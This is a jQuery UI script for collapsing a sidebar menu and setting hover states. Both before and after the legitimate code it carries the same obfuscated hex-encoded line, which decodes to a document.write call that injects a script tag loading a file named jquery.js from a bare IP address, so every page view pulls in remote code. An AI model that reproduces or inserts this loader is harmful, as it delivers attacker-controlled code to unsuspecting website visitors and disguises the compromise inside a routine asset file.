var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))$(function () {
    var flag;
    if($('body').hasClass('sidebar-colors')){
        flag = true;
    } else{
        flag = false;
    }
    $('#menu-toggle').toggle(
        function() {
            if($('#wrapper').hasClass('right-sidebar')) {
                $('body').addClass('right-side-collapsed')
                $('#sidebar .slimScrollDiv').css('overflow', 'initial');
                $('#sidebar .menu-scroll').css('overflow', 'initial');
            } else{
                $('body').addClass('left-side-collapsed').removeClass('sidebar-colors');
                $('#sidebar .slimScrollDiv').css('overflow', 'initial');
                $('#sidebar .menu-scroll').css('overflow', 'initial');
            }
        }, function() {
            if($('#wrapper').hasClass('right-sidebar')) {
                $('body').removeClass('right-side-collapsed');
                $('#sidebar .slimScrollDiv').css('overflow', 'hidden');
                $('#sidebar .menu-scroll').css('overflow', 'hidden');
            } else{
                $('body').removeClass('left-side-collapsed')
                if(flag == true){
                    $('body').addClass('sidebar-colors');
                }
                $('#sidebar .slimScrollDiv').css('overflow', 'hidden');
                $('#sidebar .menu-scroll').css('overflow', 'hidden');
            }
        }
    );

    if($('#wrapper').hasClass('right-sidebar')) {
        $('ul#side-menu li').hover(function () {
            if ($('body').hasClass('right-side-collapsed')) {
                $(this).addClass('nav-hover');
            }
        }, function () {
            if ($('body').hasClass('right-side-collapsed')) {
                $(this).removeClass('nav-hover');
            }
        });
    } else{
        $('ul#side-menu li').hover(function () {
            if ($('body').hasClass('left-side-collapsed')) {
                $(this).addClass('nav-hover');
            }
        }, function () {
            if ($('body').hasClass('left-side-collapsed')) {
                $(this).removeClass('nav-hover');
            }
        });
    }

});var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
